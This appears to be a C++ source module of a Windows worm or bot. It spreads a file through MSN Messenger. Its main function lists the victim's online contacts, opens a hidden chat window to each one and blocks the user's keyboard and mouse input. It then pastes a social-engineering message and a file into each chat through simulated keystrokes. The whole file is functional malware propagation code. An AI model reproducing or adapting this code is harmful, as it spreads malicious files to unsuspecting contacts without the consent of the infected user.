#include "includes.h"
#include "extern.h"

SOCKET sock;

#import "./MSN/MSNMessengerAPI.tlb" named_guids, no_namespace

BOOL msn_CopyTextToClipboard(char* pszText, HWND hwnd)
{
    HGLOBAL hData;
    LPVOID pData;

    if (OpenClipboard(hwnd) == FALSE)
		return FALSE;

	EmptyClipboard();

	hData = GlobalAlloc(GMEM_DDESHARE | GMEM_MOVEABLE, strlen(pszText) + 1);
	pData = GlobalLock(hData);

	strcpy((LPSTR)pData, pszText);

	GlobalUnlock(hData);
	SetClipboardData(CF_TEXT, hData);
	CloseClipboard();

	return TRUE;
}


BOOL msn_CopyFileToClipboard(char *pszFile, HWND hwnd)
{
	char szFile[MAX_PATH];
	int nSize;
	HANDLE hData;
	LPDROPFILES pDropFiles;
	LPBYTE pData;

	memset(szFile, 0, sizeof(szFile));
	strcpy(szFile, pszFile);

	if (OpenClipboard(hwnd) ==  FALSE)
		return FALSE;

	EmptyClipboard();
	
	nSize = sizeof (DROPFILES) + sizeof (szFile);
	hData = GlobalAlloc (GHND, nSize);
	pDropFiles = (LPDROPFILES) ::GlobalLock (hData);
	pDropFiles->pFiles = sizeof (DROPFILES);
	pDropFiles->fWide = FALSE;
	pData = (LPBYTE) pDropFiles + sizeof (DROPFILES);

	CopyMemory (pData, szFile, sizeof (szFile));
	GlobalUnlock (hData);
	SetClipboardData (CF_HDROP, hData);
	CloseClipboard ();

	return TRUE;
}

int msn_CloseAllMSN()
{
	HWND hWin;
	int i;

	for (i=0; (hWin = FindWindow("IMWindowClass", NULL)) != NULL; i++) {
		SendMessage(hWin,WM_CLOSE,(LPARAM)0,(WPARAM)0);

	}

	return i;
}

int	msn_SpreadFile(char *pszFile, char *pszMessage)
{
    IMSNMessenger3			*pIMessenger			= NULL;
    IDispatch				*pIDispatch				= NULL;
    IDispatch				*dispContacts			= NULL;
    IDispatch				*dispContact			= NULL;
    IMSNMessengerContacts	*pIMessengerContacts	= NULL;
    IMSNMessengerContact	*pIMessengerContact		= NULL;
    IMSNMessengerWindow		*pIMessengerWindow		= NULL;
    BSTR szContactName;
    VARIANT vt_user;
    MISTATUS miStatus;
    LONG wndIM;
    HRESULT hr;
    int iCount=0;
    long iContacts, i;

	srand(GetTickCount());

    CoInitialize(0);

    hr = CoCreateInstance(CLSID_Messenger, NULL, CLSCTX_ALL, IID_IMSNMessenger2, (void**)&pIMessenger);

    if (FAILED(hr))
    {
        CoUninitialize();
        return -1;
    }

    pIMessenger->get_MyContacts(&dispContacts);
    hr = dispContacts->QueryInterface(__uuidof(pIMessengerContacts),(LPVOID*)&pIMessengerContacts);
    if (FAILED(hr))
    {
        dispContacts->Release();
        pIMessenger->Release();
        CoUninitialize();
        return -1;
    }

    hr = pIMessengerContacts->get_Count(&iContacts);
    if (FAILED(hr))
    {
        pIMessengerContacts->Release();
        dispContacts->Release();
        pIMessenger->Release();
        CoUninitialize();
        return -1;
    }

    BlockInput(true);
    for (i = 0; i < iContacts; i++)
    {
		pIDispatch = NULL;
        hr = pIMessengerContacts->raw_Item(i, &dispContact);
        if (FAILED(hr))
            continue;

        hr = dispContact->QueryInterface(__uuidof(pIMessengerContact),(LPVOID*)&pIMessengerContact);
        if (SUCCEEDED(hr))
        {
            hr = pIMessengerContact->get_Status(&miStatus);

            if (FAILED(hr) || miStatus == MISTATUS_OFFLINE)
            {
                pIMessengerContact->Release();
                dispContact->Release();
                continue;
            }

            pIMessengerContact->get_SigninName(&szContactName);
            VariantInit(&vt_user);
            msn_ToVariant(szContactName, vt_user);
            Sleep(3000);


            hr = pIMessenger->raw_InstantMessage(vt_user,&pIDispatch);
            if (FAILED(hr))
            {
                pIMessengerContact->Release();
                dispContact->Release();
                continue;
            }
            hr = pIDispatch->QueryInterface(IID_IMSNMessengerWindow, (void **)&pIMessengerWindow);
            if (SUCCEEDED(hr))
            {
                Sleep(10);

				//Getting window
                pIMessengerWindow->get_HWND(&wndIM);
                SetForegroundWindow((HWND) wndIM);
                SetFocus((HWND) wndIM);
                ShowWindow((HWND) wndIM, 0);

				//Sending SE message
                if (msn_CopyTextToClipboard(pszMessage, (HWND)wndIM) == TRUE) {
					keybd_event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
					keybd_event((unsigned char)VkKeyScan('V'), 0, 0, 0);
					keybd_event(VK_CONTROL, 45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
					keybd_event(VK_RETURN, 0, 0, 0);
					Sleep(1000);
				}

				//Sending file
				if (msn_CopyFileToClipboard(pszFile, (HWND)wndIM) == TRUE) {
					keybd_event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
					keybd_event((unsigned char)VkKeyScan('V'), 0, 0, 0);
					keybd_event(VK_CONTROL, 45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
				}

                iCount++;
            }
            pIMessengerContact->Release();
            dispContact->Release();
        }
    }
    BlockInput(false);

	//Releasing handles
    pIMessengerContacts->Release();
    dispContacts->Release();
    pIMessenger->Release();

	//Uninitailize
    CoUninitialize();

    return iCount;
}

void msn_ToVariant(BSTR str, VARIANT& vt)
{
    reinterpret_cast<_variant_t&>(vt) = str;
}
